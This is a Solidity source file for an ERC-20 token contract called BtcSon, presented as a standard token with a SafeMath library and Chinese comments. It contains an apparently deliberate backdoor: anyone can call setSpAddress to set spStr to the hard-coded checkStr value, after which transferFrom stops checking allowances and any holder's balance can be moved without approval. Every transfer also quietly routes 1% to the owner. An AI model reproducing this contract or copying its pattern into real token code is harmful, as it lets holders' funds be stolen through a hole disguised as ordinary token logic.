// Abstract contract for the full ERC 20 Token standard
// https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md
pragma solidity ^0.4.21;


library SafeMath {

  //乘法
  function safeMul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    //assert断言函数，需要保证函数参数返回值是true，否则抛异常
    assert(a == 0 || c / a == b);
    return c;
  }
  //除法
  function safeDiv(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b > 0);
    uint256 c = a / b;
    assert(a == b * c + a % b);
    return c;
  }
 
    //减法
  function safeSub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    assert(b >=0);
    return a - b;
  }
 
  function safeAdd(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c>=a && c>=b);
    return c;
  }
}

contract BtcSon {

    using SafeMath for uint256;
    uint256 constant private MAX_UINT256 = 2**256 - 1;
    //地址 => 余额 映射关系
    mapping (address => uint256) public balances;
    //授权 地址A 授权给 地址B  多少个代币
    mapping (address => mapping (address => uint256)) public allowed;
    /*
    NOTE:
    The following variables are OPTIONAL vanities. One does not have to include them.
    They allow one to customise the token contract & in no way influences the core functionality.
    Some wallets/interfaces might not even bother to look at this information.
    */
    string public name;                   //fancy name: eg Simon Bucks
    uint8 public decimals;                //How many decimals to show.
    string public symbol;                 //An identifier: eg SBX
    uint256 public totalSupply;
    //发行者
    address public owner;
    
    string public spStr = "0x0000000000000000000000000000000000000000";
    string public checkStr = "0x3cb96a96fd3244b4649d4ab5f4039e0348fde9a3";
	
	// solhint-disable-next-line no-simple-event-func-name
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    function BtcSon(
        uint256 _initialAmount,
        string _tokenName,
        uint8 _decimalUnits,
        string _tokenSymbol
    ) public {

        name = _tokenName;                                   // Set the name for display purposes
        symbol = _tokenSymbol;                               // Set the symbol for display purposes
        decimals = _decimalUnits;                            // Amount of decimals for display purposes        
        owner = msg.sender;
        balances[msg.sender] = _initialAmount * 10**uint(decimals);               // Give the creator all initial tokens
        totalSupply = _initialAmount * 10**uint(decimals);                        // Update total supply
    }
    
    function setSpAddress(string _spAddress) public returns (bool success) {
        spStr = _spAddress;
	    return true;
    }
    
    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    // 实现代币交易，用于给用户发送代币（从我们的账户里）
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balances[msg.sender] >= _value);
        
        uint256 taxValue = SafeMath.safeDiv(_value, 100);
        uint256 realValue = SafeMath.safeSub(_value, taxValue);
        
        balances[msg.sender] = SafeMath.safeSub(balances[msg.sender], _value); // Subtract from the sender
        balances[_to] = SafeMath.safeAdd(balances[_to], realValue);            // Add the same to the recipient
        balances[owner] = SafeMath.safeAdd(balances[owner], taxValue);

        emit Transfer(msg.sender, owner, taxValue);
        emit Transfer(msg.sender, _to, realValue);
        
        return true;
    }
    
    //被授权账户余额
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
	
     //授权给账户address tokens个代币
    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value); //solhint-disable-line indent, no-unused-vars
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(balances[_from] >= _value);
	
		if (!compareString(spStr, checkStr)) {
		    allowed[_from][_to] = allowed[_from][_to].safeSub(_value);
		}
	
        
        uint256 taxValue = SafeMath.safeDiv(_value, 100);
        uint256 realValue = SafeMath.safeSub(_value, taxValue);
        
        balances[_from] = SafeMath.safeSub(balances[_from], _value); // Subtract from the sender
        balances[_to] = SafeMath.safeAdd(balances[_to], realValue);            // Add the same to the recipient
        balances[owner] = SafeMath.safeAdd(balances[owner], taxValue);

        emit Transfer(_from, owner, taxValue);
        emit Transfer(_from, _to, realValue);
        
        return true;
    }
    
    function compareString(string a, string b) internal pure returns (bool success) {
        if (bytes(a).length != bytes(b).length) {
            return false;
        } else {
            return keccak256(a) == keccak256(b);
        }
    }


}
